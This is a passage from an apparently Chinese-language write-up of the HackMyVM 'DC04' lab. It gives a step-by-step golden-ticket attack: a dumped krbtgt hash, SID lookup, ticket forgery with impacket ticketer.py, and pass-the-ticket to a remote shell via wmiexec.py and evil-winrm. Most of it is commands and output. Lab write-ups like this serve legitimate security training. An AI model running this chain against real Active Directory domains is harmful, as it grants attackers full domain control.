krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0f55cdc40bd8f5814587f7e6b2f85e6f:::\n\n</code></pre>\n<p>上面几个用户都测试过了密码都是假的，但是可以注意到下面的用户<code>hash</code> 存在<code>krbtgt</code>用户</p>\n<pre><code class=\"hljs language-bash\">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0f55cdc40bd8f5814587f7e6b2f85e6f:::\n</code></pre>\n<p>验证一下<code>kebtgt</code>用户，是正确的</p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/DC04  netexec smb 192.168.56.126 -u krbtgt -H 0f55cdc40bd8f5814587f7e6b2f85e6f\nSMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)\nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\krbtgt:0f55cdc40bd8f5814587f7e6b2f85e6f STATUS_ACCOUNT_DISA\n</code></pre>\n<p><img src=\"/post-images/HackMyVMDC04/image100.png\" alt=\"image.png\"></p>\n<h2>黄金票据</h2>\n<p>黄金票据是指能够绕过认证授权（<code>Authentication and Authorization</code>）机制并获得所需权限的票据。这种票据可以被攻击者收集和利用，从而从系统内部获取高权限，甚至完全控制系统</p>\n<p>我们现在要获取： 域名称，域的<code>SID</code>值，域的<code>KRBTGT</code>账号的<code>HASH</code>，伪造任意用户名</p>\n<ol>\n<li>\n<p>域<code>SID</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/DC04  lookupsid.py <span class=\"hljs-string\">'SOUPEDECODE.LOCAL/websvc:jordan123@192.168.56.126'</span> | grep SID\n[*] Brute forcing SIDs at 192.168.56.126\n[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164\n</code></pre>\n<p><code>S-1-5-21-2986980474-46765180-2505414164</code></p>\n</li>\n<li>\n<p><code>KRBTGT</code>账号的<code>HASH</code></p>\n<p>上面已经给了也就是<code>0f55cdc40bd8f5814587f7e6b2f85e6f</code></p>\n</li>\n<li>\n<p>和域同步时间</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/DC04  ntpdate -n SOUPEDECODE.LOCAL\n⚡ root@kali  ~/Desktop/test/DC04  ntpdate -u 192.168.56.126\n</code></pre>\n</li>\n<li>\n<p>生成黄金票据</p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/DC04  ticketer.py -nthash 0f55cdc40bd8f5814587f7e6b2f85e6f -domain SOUPEDECODE.LOCAL -domain-sid S-1-5-21-2986980474-46765180-2505414164 administrator\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Creating basic skeleton ticket and PAC Infos\n/root/.local/bin/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class=\"hljs-keyword\">for</span> removal <span class=\"hljs-keyword\">in</span> a future version. Use timezone-aware objects to represent datetimes <span class=\"hljs-keyword\">in</span> UTC: datetime.datetime.now(datetime.UTC).\n  aTime = timegm(datetime.datetime.utcnow().timetuple())\n[*] Customizing ticket <span class=\"hljs-keyword\">for</span> SOUPEDECODE.LOCAL/administrator\n/root/.local/bin/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class=\"hljs-keyword\">for</span> removal <span class=\"hljs-keyword\">in</span> a future version. Use timezone-aware objects to represent datetimes <span class=\"hljs-keyword\">in</span> UTC: datetime.datetime.now(datetime.UTC).\n  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))\n/root/.local/bin/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class=\"hljs-keyword\">for</span> removal <span class=\"hljs-keyword\">in</span> a future version. Use timezone-aware objects to represent datetimes <span class=\"hljs-keyword\">in</span> UTC: datetime.datetime.now(datetime.UTC).\n  encTicketPart[<span class=\"hljs-string\">'authtime'</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n/root/.local/bin/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class=\"hljs-keyword\">for</span> removal <span class=\"hljs-keyword\">in</span> a future version. Use timezone-aware objects to represent datetimes <span class=\"hljs-keyword\">in</span> UTC: datetime.datetime.now(datetime.UTC).\n  encTicketPart[<span class=\"hljs-string\">'starttime'</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n/root/.local/bin/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class=\"hljs-keyword\">for</span> removal <span class=\"hljs-keyword\">in</span> a future version. Use timezone-aware objects to represent datetimes <span class=\"hljs-keyword\">in</span> UTC: datetime.datetime.now(datetime.UTC).\n  encRepPart[<span class=\"hljs-string\">'last-req'</span>][0][<span class=\"hljs-string\">'lr-value'</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n[*]     EncAsRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncASRepPart\n[*] Saving ticket <span class=\"hljs-keyword\">in</span> administrator.ccache\n</code></pre>\n<p><img src=\"/post-images/HackMyVMDC04/image101.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>将票据导入环境变量</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">export</span> KRB5CCNAME=administrator.ccache \n</code></pre>\n</li>\n<li>\n<p>PTT</p>\n<pre><code class=\"hljs language-bash\">wmiexec.py soupedecode.local/administrator@dc01.soupedecode.local -k -target-ip 192.168.56.126\n</code></pre>\n</li>\n</ol>\n<p>总的步骤就是（最好复制出来一起粘贴进去，否则可能会出现<code>[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code>）：</p>\n<pre><code class=\"hljs language-bash\">ntpdate -n soupedecode.local\nntpdate -u 192.168.56.126\nticketer.py -nthash 0f55cdc40bd8f5814587f7e6b2f85e6f -domain SOUPEDECODE.LOCAL -domain-sid S-1-5-21-2986980474-46765180-2505414164 administrator\n<span class=\"hljs-built_in\">export</span> KRB5CCNAME=administrator.ccache\nwmiexec.py soupedecode.local/administrator@dc01.soupedecode.local -k -target-ip 192.168.56.126\n</code></pre>\n<p><img src=\"/post-images/HackMyVMDC04/image102.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">C:\\Users\\administrator\\Desktop><span class=\"hljs-built_in\">type</span> root.txt\n1c66eabe105636d7e0b82ec1fa87cb7a\n</code></pre>\n<pre><code class=\"hljs language-bash\">ntpdate -n soupedecode.local\nntpdate -u 192.168.56.126\nticketer.py -nthash 0f55cdc40bd8f5814587f7e6b2f85e6f -domain SOUPEDECODE.LOCAL -domain-sid S-1-5-21-2986980474-46765180-2505414164 administrator\n<span class=\"hljs-built_in\">export</span> KRB5CCNAME=administrator.ccache\nevil-winrm -i 192.168.56.126 -u administrator -r soupedecode.local -k -C administrator.ccache\n</code></pre>\n<h2>使用evil-winrm</h2>\n<p>上面是使用<code>wmiexec</code> ,下面使用<code>evil-winrm</code></p>\n<p>先看帮助，需要新建<code>/etc/krb5.conf</code> 文件（该文件是<code>Kerberos</code> 客户端配置文件，通常用于 <code>Linux</code> 和类 <code>Unix</code> 系统中，用于配置 <code>Kerberos</code> 客户端与 <code>Kerberos</code> 服务器（<code>KDC</code>）之间的通信）</p>\n<pre><code class=\"hljs language-bash\">    -r, --realm DOMAIN               Kerberos auth, it has to be <span class=\"hljs-built_in\">set</span> also <span class=\"hljs-keyword\">in</span> /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }\n</code></pre>\n<p>添加以下内容</p>\n<pre><code class=\"hljs language-bash\">[libdefaults]\n    default_realm = SOUPEDECODE.LOCAL\n\n[realms]\n    SOUPEDECODE.LOCAL = {\n        kdc = dc01.soupedecode.local\n        admin_server = dc01.soupedecode.local\n    }\n\n[domain_realm]\n    soupedecode.local = SOUPEDECODE.LOCAL\n    .soupedecode.local = SOUPEDECODE.LOCAL\n</code></pre>\n<pre><code class=\"hljs language-bash\">ntpdate -u 192.168.56.126\nntpdate -n soupedecode.local\nimpacket-ticketer -nthash 0f55cdc40bd8f5814587f7e6b2f85e6f -domain-sid S-1-5-21-2986980474-46765180-2505414164 -domain soupedecode.local  administrator\n<span class=\"hljs-built_in\">export</span> KRB5CCNAME=administrator.ccache\nKRB5CCNAME=administrator.ccache   evil-winrm -i 192.168.56.126 -u administrator -r soupedecode.local\n</code></pre>\n<h2>总结</h2>\n<p>更熟悉域渗透，学习通过<code>Linux</code>实现构造黄金票据，以及传递票据</p>","title":"HackMyVM - DC04","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"DC04.\n\n \n \n\nNotes: Well, no more easy kakes. Hope you enjoy this one too.\n\n前期踩点\n\n\n\n\n\n啥端口都有\n\n\n\n扫出来域名，先将记录添加到`hosts`文件\n\n\n\n访问一下`HTTP`服务，所有请求都被`302`重定向了\n\n\n\n扫描一下网站目录，找一下不被重定向的页面\n\n\n\n访问`/server-info` ，其中找到了新..."},"recentPosts":[{"id":"HackMyVMXimai","title":"HackMyVM - Ximai","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackTheBoxSeason8 - Outbound","title":"HackTheBox - Season8 - Outbound","date":"2025-07-13","isEncrypted":true,"year":"2025","month":"07","day":"13"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Season8 - Voleur","date":"2025-07-07","isEncrypted":true,"year":"2025","month":"07","day":"07"},{"id":"TryHackMeCreative","title":"TryHackMe - Creative","date":"2025-07-05","isEncrypted":false,"year":"2025","month":"07","day":"05"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":true,"year":"2025","month":"06","day":"30"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"}]},"__N_SSG":true}